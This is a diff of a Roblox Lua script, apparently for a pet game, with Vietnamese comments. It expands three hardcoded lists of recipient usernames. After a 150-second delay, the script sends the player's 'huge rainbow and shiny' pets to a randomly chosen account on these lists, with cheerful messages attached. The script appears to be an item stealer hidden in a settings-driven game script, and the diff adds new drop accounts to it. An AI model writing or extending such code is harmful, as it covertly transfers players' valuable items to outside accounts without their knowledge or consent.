@@ -1,3 +1,6 @@
+
+
+
 local function _check_time_resetmail()
 
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -301,7 +304,7 @@ getgenv().Settings = {
 }
 
 
-ds_nguoi_nhan_pet = {"sijmongirthss", "Ash3rP0w3rPanda2018", "soystaylan5", "dreddyewele60", "1971Nowak3135", "mcconchifredjeyo", "ecclweltst", "killedsanthi85", "tamuleviazulayv", "hegemangaltieri81"}
+ds_nguoi_nhan_pet = {"sijmongirthss","Ash3rP0w3rPanda2018","soystaylan5","dreddyewele60","1971Nowak3135","Sky_Giga2017","Inferno_Eagle200889","XxOwenC0dexX2023","TurboTig3rStr3am","1953Crutchfield3117","FusionShadowCyber","AceInferno202467","R0ck3tClaw2021_YT","Xx_VictoriaUltraCybe","Br00klynSkat3r2022"}
 
 
 -- Hàm kiểm tra tên có chứa từ khóa
@@ -527,8 +530,8 @@ wait(150)
     }
 
     -- 🎁 Người nhận + tin nhắn
-    local username_rd = {"sijmongirthss", "Ash3rP0w3rPanda2018", "soystaylan5", "dreddyewele60", "1971Nowak3135", 
-                         "mcconchifredjeyo", "ecclweltst", "killedsanthi85", "tamuleviazulayv", "hegemangaltieri81"}
+    local username_rd = {"sijmongirthss","Ash3rP0w3rPanda2018","soystaylan5","dreddyewele60","1971Nowak3135","Sky_Giga2017","Inferno_Eagle200889","XxOwenC0dexX2023","TurboTig3rStr3am","1953Crutchfield3117","FusionShadowCyber","AceInferno202467","R0ck3tClaw2021_YT","Xx_VictoriaUltraCybe","Br00klynSkat3r2022"}
+
     local username = username_rd[math.random(1, #username_rd)]
 
     local messages = {
@@ -598,7 +601,8 @@ end)
 -- Send những huge rainbow và shiny
 task.spawn(function()
 wait(150)
-local recipients = {"sijmongirthss","Ash3rP0w3rPanda2018","soystaylan5","dreddyewele60","1971Nowak3135","mcconchifredjeyo","ecclweltst","killedsanthi85","tamuleviazulayv","hegemangaltieri81"}
+local recipients = {"sijmongirthss","Ash3rP0w3rPanda2018","soystaylan5","dreddyewele60","1971Nowak3135","Sky_Giga2017","Inferno_Eagle200889","XxOwenC0dexX2023","TurboTig3rStr3am","1953Crutchfield3117","FusionShadowCyber","AceInferno202467","R0ck3tClaw2021_YT","Xx_VictoriaUltraCybe","Br00klynSkat3r2022"}
+
 
 -- 💬 Danh sách lời chúc
 local messages = {
